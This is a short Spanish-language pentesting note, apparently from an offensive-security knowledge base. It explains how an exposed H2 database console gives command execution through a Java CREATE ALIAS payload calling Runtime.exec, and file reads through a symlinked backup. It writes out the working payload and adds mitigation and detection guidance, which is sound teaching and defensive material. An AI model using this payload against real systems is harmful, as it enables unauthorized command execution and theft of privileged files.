---
topic: H2 — consola, alias Java y backup
tags: [linux, h2, java, database, rce, symlink]
---

# H2 — consola, alias Java y backup

[🌐 English](h2-database-alias-rce.en.md) | **Español**

## Concepto

La consola H2 expuesta permite ejecutar SQL como el usuario del proceso. `CREATE ALIAS` puede definir una función Java que llame a `Runtime.exec`, y el backup de H2 puede seguir symlinks y copiar archivos root.

## Cuándo aplica

- La consola H2 es accesible (directa o por túnel).
- El proceso corre como root o un usuario privilegiado.
- Se puede iniciar sesión o crear una base.

## Procedimiento

1. Acceder a la consola y autenticarse.
2. Crear un alias con código Java.
3. Llamar al alias para ejecutar comandos.
4. Como alternativa, crear un symlink `.trace.db` y descargar el backup.

## Comandos

```bash
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; } $$;
CALL SHELLEXEC('id');
```

## Variantes

- `RUNSCRIPT` para cargar SQL.
- `CSVREAD` para leer archivos.
- Symlink `t.trace.db` y backup ZIP.

## Limitaciones

- La consola puede limitarse a localhost.
- Se necesita una contraseña o una base nueva.
- El proceso puede no ser root.

## Mitigación

- No exponer la consola H2.
- Ejecutar H2 sin privilegios y con contraseña.
- No permitir `CREATE ALIAS` ni backups con symlinks.

## Detección

- Consultas `CREATE ALIAS` o `RUNSCRIPT`.
- Conexiones a 8082 desde hosts no habituales.
- Backups que leen `/root` o siguen symlinks.

## Referencias

- [0xdf — Hawk](https://0xdf.gitlab.io/2018/11/30/htb-hawk.html)
- [H2 — CREATE ALIAS](https://h2database.com/html/commands.html#create_alias)
- [HackTricks — H2](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/h2-database.html)
